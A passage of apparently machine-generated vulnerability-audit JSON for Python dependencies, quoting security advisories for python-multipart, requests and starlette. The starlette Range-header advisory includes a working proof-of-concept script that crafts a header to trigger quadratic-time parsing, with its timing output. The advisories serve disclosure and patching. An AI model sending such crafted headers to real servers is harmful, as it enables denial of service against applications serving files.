This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}]}, {"name": "requests", "version": "2.32.3", "vulns": [{"id": "CVE-2024-47081", "fix_versions": ["2.32.4"], "aliases": ["GHSA-9hjg-9r4m-mvj7"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "google-cloud-vision", "version": "3.7.4", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "google-api-core", "version": "2.28.1", "vulns": []}, {"name": "google-auth", "version": "2.45.0", "vulns": []}, {"name": "cachetools", "version": "6.2.4", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.72.0", "vulns": []}, {"name": "grpcio", "version": "1.76.0", "vulns": []}, {"name": "grpcio-status", "version": "1.71.2", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "proto-plus", "version": "1.27.0", "vulns": []}, {"name": "protobuf", "version": "5.29.5", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "starlette", "version": "0.41.3", "vulns": [{"id": "CVE-2025-54121", "fix_versions": ["0.47.2"], "aliases": ["GHSA-2c2j-9gv5-cj73"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk.

In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "CVE-2025-62727", "fix_versions": ["0.49.1"], "aliases": ["GHSA-7f5h-v6xp-fcq8"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints.
